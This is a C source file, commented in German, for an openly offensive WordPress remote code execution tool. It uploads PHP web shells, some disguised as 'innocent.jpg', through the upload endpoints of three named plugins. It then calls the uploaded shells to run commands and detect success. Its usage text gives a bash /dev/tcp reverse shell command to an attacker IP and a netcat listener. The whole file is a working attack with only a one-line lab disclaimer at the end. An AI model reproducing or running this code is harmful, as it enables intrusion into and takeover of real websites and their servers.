#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#define MAX_URL      512
#define MAX_CMD      512
#define MAX_B64      2048
#define TIMEOUT_MS   15000

struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t write_memory_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) return 0;
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

// Einfache Base64-Encode-Funktion (keine externe Lib)
void base64_encode(const char *input, size_t len, char *output) {
    const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t i, j = 0;
    for (i = 0; i < len; ) {
        unsigned int octet_a = i < len ? (unsigned char)input[i++] : 0;
        unsigned int octet_b = i < len ? (unsigned char)input[i++] : 0;
        unsigned int octet_c = i < len ? (unsigned char)input[i++] : 0;

        unsigned int triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        output[j++] = b64[(triple >> 3 * 6) & 0x3F];
        output[j++] = b64[(triple >> 2 * 6) & 0x3F];
        output[j++] = b64[(triple >> 1 * 6) & 0x3F];
        output[j++] = b64[(triple >> 0 * 6) & 0x3F];
    }
    // Padding
    if (len % 3 == 1) { output[j-2] = '='; output[j-1] = '='; }
    else if (len % 3 == 2) { output[j-1] = '='; }
    output[j] = '\0';
}

int looks_like_rce(const char *response) {
    if (!response) return 0;
    const char *indicators[] = {
        "uid=", "gid=", "root:x:0:0:", "whoami", "Linux version",
        "nt authority\\system", "bash: interactive", "Connection refused",
        "No route to host", "base64_decode", "shell executed", NULL
    };
    for (int i = 0; indicators[i]; i++) {
        if (strstr(response, indicators[i])) return 1;
    }
    return 0;
}

void escape_shell_arg(char *dst, const char *src, size_t dst_size) {
    size_t j = 0;
    for (size_t i = 0; src[i] && j < dst_size - 1; i++) {
        switch (src[i]) {
            case '"': case '\\': case '$': case '`': case '\'':
                if (j + 1 < dst_size) dst[j++] = '\\';
            default:
                dst[j++] = src[i];
        }
    }
    dst[j] = '\0';
}

int try_multipart_upload(const char *base, const char *path, const char *action,
                         const char *extra_name, const char *extra_val,
                         const char *file_field, const char *filename,
                         const char *cmd, int use_base64) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL];
    snprintf(url, sizeof(url), "%s%s", base, path);

    struct MemoryStruct chunk = { .memory = malloc(1), .size = 0 };
    chunk.memory[0] = 0;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_memory_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (WP-RCE/2026)");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part;

    if (action && *action) {
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "action");
        curl_mime_data(part, action, CURL_ZERO_TERMINATED);
    }
    if (extra_name && extra_val) {
        part = curl_mime_addpart(mime);
        curl_mime_name(part, extra_name);
        curl_mime_data(part, extra_val, CURL_ZERO_TERMINATED);
    }

    // Dynamischer Content + optional Base64
    char escaped_cmd[MAX_CMD * 2];
    escape_shell_arg(escaped_cmd, cmd, sizeof(escaped_cmd));

    char raw_payload[2048];
    int is_reverse = (strstr(cmd, "bash -i") || strstr(cmd, "/dev/tcp") ||
                      strstr(cmd, "nc ") || strstr(cmd, "socket"));

    if (is_reverse) {
        snprintf(raw_payload, sizeof(raw_payload), "<?php system('%s'); ?>", escaped_cmd);
    } else {
        snprintf(raw_payload, sizeof(raw_payload),
                 "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);exit;}else{system('%s');} ?>", escaped_cmd);
    }

    char final_payload[MAX_B64];
    if (use_base64) {
        base64_encode(raw_payload, strlen(raw_payload), final_payload);
        printf("[*] Base64-encoded payload (Stage 1): %.80s...\n", final_payload);
    } else {
        strncpy(final_payload, raw_payload, sizeof(final_payload) - 1);
        final_payload[sizeof(final_payload)-1] = '\0';
    }

    part = curl_mime_addpart(mime);
    curl_mime_name(part, file_field ? file_field : "file");
    curl_mime_data(part, final_payload, strlen(final_payload));
    curl_mime_filename(part, filename ? filename : "innocent.jpg");
    curl_mime_type(part, "image/jpeg");

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    int success = 0;
    if (res == CURLE_OK && http_code >= 200 && http_code < 300) {
        printf("[+] Upload Stage 1 OK: %s (HTTP %ld)\n", url, http_code);
        if (looks_like_rce(chunk.memory)) {
            printf("[!!!] Früher RCE-Indikator (selten): %.150s...\n", chunk.memory);
            success = 1;
        }
    } else {
        printf("[-] Stage 1 failed: %s → %s (HTTP %ld)\n", url, curl_easy_strerror(res), http_code);
    }

    curl_mime_free(mime);
    if (chunk.memory) free(chunk.memory);
    curl_easy_cleanup(curl);
    return success;
}

int try_execution_stage(const char *base, const char *shell_path, const char *cmd) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL];
    int is_reverse = (strstr(cmd, "bash -i") || strstr(cmd, "/dev/tcp"));
    if (is_reverse) {
        snprintf(url, sizeof(url), "%s%s", base, shell_path);
    } else {
        snprintf(url, sizeof(url), "%s%s?cmd=%s", base, shell_path, cmd);
    }

    struct MemoryStruct chunk = { .memory = malloc(1), .size = 0 };
    chunk.memory[0] = 0;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_memory_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (WP-RCE/2026)");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    int success = 0;
    if (res == CURLE_OK && http_code == 200 && looks_like_rce(chunk.memory)) {
        printf("[!!!] Stage 2/3 SUCCESS – RCE bestätigt: %s\nOutput: %.400s...\n", url, chunk.memory);
        success = 1;
    } else if (chunk.memory && strlen(chunk.memory) > 10) {
        printf("[?] Stage 2 Check: %s (HTTP %ld) → %.150s...\n", url, http_code, chunk.memory);
    }

    if (chunk.memory) free(chunk.memory);
    curl_easy_cleanup(curl);
    return success;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        puts("Usage: ./wp_rce_base64_multi http://target [custom_command] [base64]");
        puts("  custom_command    z.B. 'id' | 'whoami' | 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'");
        puts("  base64            (optional) → Webshell base64-kodiert hochladen");
        puts("Beispiel:");
        puts("  ./wp_rce_base64_multi http://192.168.1.100 \"uname -a\" base64");
        puts("  nc -lvnp 4444    ← vorher starten für Reverse-Shell");
        return 1;
    }

    curl_global_init(CURL_GLOBAL_ALL);
    const char *base = argv[1];
    const char *cmd = (argc >= 3) ? argv[2] : "id";
    int use_base64 = (argc >= 4 && strcmp(argv[3], "base64") == 0);

    printf("=== WordPress Base64 + Multi-Stage RCE ===\n");
    printf("Target: %s\nCommand: %s\nBase64-Encoding: %s\n\n", base, cmd, use_base64 ? "ENABLED" : "disabled");

    int hits = 0;

    // Stage 1: Uploads (Multi-Target)
    hits += try_multipart_upload(base, "/wp-admin/admin-ajax.php",
                                 "wpvivid_receive_backup", "key", "testkey123",
                                 "backup_file", "shell.php", cmd, use_base64);

    hits += try_multipart_upload(base, "/wp-content/plugins/simple-file-list/ee-upload-engine.php?reqpath=/wp-content/uploads/",
                                 NULL, "eeajaxrequest", "eeupload",
                                 "files[]", "innocent.jpg", cmd, use_base64);

    hits += try_multipart_upload(base, "/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/upload_file.php",
                                 NULL, NULL, NULL,
                                 "file", "shell.php", cmd, use_base64);

    // Stage 2/3: Execution-Checks (Multi-Pfad)
    const char *shell_paths[] = {
        "/wp-content/uploads/shell.php",
        "/wp-content/uploads/innocent.jpg",
        "/wp-content/uploads/wpvivid_backup/shell.php",
        "/wp-content/plugins/simple-file-list/upload/innocent.jpg",
        NULL
    };

    for (int i = 0; shell_paths[i]; i++) {
        hits += try_execution_stage(base, shell_paths[i], cmd);
    }

    printf("\nScan abgeschlossen. Potenzielle Multi-Stage-Treffer: %d\n", hits);
    puts("Hinweis: Bei base64 + Reverse-Shell → Erfolg oft nur im Netcat-Listener sichtbar.");
    puts("Nur in eigenen Labs / mit Erlaubnis nutzen!");

    curl_global_cleanup();
    return 0;
}
